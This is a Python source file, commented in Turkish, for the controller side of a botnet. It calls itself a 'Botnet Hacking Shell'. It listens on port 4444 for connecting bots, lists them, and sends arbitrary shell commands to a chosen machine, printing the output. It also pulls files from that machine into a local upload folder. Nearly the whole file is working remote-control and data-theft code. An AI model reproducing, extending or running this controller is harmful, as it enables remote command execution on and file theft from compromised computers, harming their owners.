import socket
import threading

host = "localhost"
port = 4444

# Soketi Oluşturduk
s = socket.socket()

baglanti_listesi = []
adres_listesi = []

# ------------------------------------------------------------------- #

# Server'ı Oluşturup Dinlemeye Aldığımız Kısım
def bagla():

    try:
        # Soketi Bu ip ve port'a Bağlıyoruz
        s.bind((host, port))

        # Soketi Dinlemeye Aldık
        s.listen(30)

    except:
        print("Bağlantı Hatası... Tekrar Deneniyor...")
        bagla()

# ------------------------------------------------------------------- #

# Gelen Bağlantıları Kabul Ettiğimiz Kısım
def kabul_et():

    while True:
        try:

            # baglanti değişkeni bizim alış-veriş yaptığımız adresi, adres değişkeni ise karşı tarafın ip ve port değerlerini barındırır.
            baglanti, adres = s.accept()

            # Gelen Bağlantıyı Bağlantı Listesine, Adresi ise Adres Listesine Ekledik

            baglanti_listesi.append(baglanti)
            adres_listesi.append(adres)

            print(f"\n{adres[0]} Nolu İp ve {adres[1]} Nolu Porttan Bağlantı Geldi")
        except:
            print("Bağlantı Hatası")

# ------------------------------------------------------------------- #

def ana_shell():
    while True:

        try:

            print("Botnet Hacking Shell'e Hoşgeldin :)")
            komut = input("Komutunuzu Girin: ") # 'baglan 5'

            if komut == "sırala" or komut == "sirala":
                sirala()
            elif "baglan" in komut:

                try:
                    rakam = int(komut[-1])
                    baglanti = baglan(rakam)

                    if baglanti:

                        istek = input("Ne Yapmak İstiyorsun: ")

                        if istek == "cmd":
                            baglanti.send("cmd".encode('utf-8'))
                            komut_yolla(baglanti)

                        elif istek == "dosya transferi":

                            baglanti.send(istek.encode('utf-8'))
                            dosya_transferi(baglanti)
                        
                        else:
                            print("Geçersiz İstek")


                except ValueError:
                    print("Value Error")
                    

            else:
                print("Bilinmeyen Komut")

        except:
            print("Bilgisayarın Bağlantısı Kopmuş Olabilir...")


# ------------------------------------------------------------------- #

def baglan(index):
    
    try:

        baglanti = baglanti_listesi[index]
        print(adres_listesi[index][0] + " Adresine Bağlantı Sağlandı")
        return baglanti

    except:
        print(str(index) + ". Bağlantı Mevcut Değil!")
        return False


# ------------------------------------------------------------------- #

def sirala():

    print("#----------- Client Listesi -----------#\n")

    for sayac, baglanti in enumerate(baglanti_listesi):

        try:
            baglanti.send(b" ")
            baglanti.recv(1024)
        except:
            baglanti_listesi.pop(sayac)
            adres_listesi.pop(sayac)
            continue

        print(str(sayac) + " " + str(adres_listesi[sayac][0]) + " " + str(adres_listesi[sayac][1]))
        print("#---------------------------------------#")
# ------------------------------------------------------------------- #

def komut_yolla(baglanti):

    while True:

        cmd = input("Komutunuzu Giriniz: ")

        if cmd == "quit":
            baglanti.send("quit".encode("utf-8"))
            break

        elif len(cmd) > 0:

            baglanti.send(cmd.encode("utf-8"))

            cevap = baglanti.recv(4096).decode("utf-8")

            print(cevap)

# ------------------------------------------------------------------- #


def dosya_transferi(baglanti):

    konum = input('Konum: ')
    baglanti.send(konum.encode('utf-8'))
    boyut = int(baglanti.recv(1024).decode('utf-8'))
    baglanti.send(b" ")
    gelen_boyut = 0

    ad = input("Dosyanızın Adı: ")

    with open("C:/Users/B3YD4/Desktop/SocketUploadFiles/" + ad,"wb") as dosya:
        
        while True:

            veri = baglanti.recv(1024)

            gelen_boyut += len(veri)

            dosya.write(veri)

            if gelen_boyut >= boyut:

                break
        print("Dosya Transferi Tamamlandı.")
        



bagla()

shell = threading.Thread(target=ana_shell)
kabul = threading.Thread(target=kabul_et)
shell.start()
kabul.start()
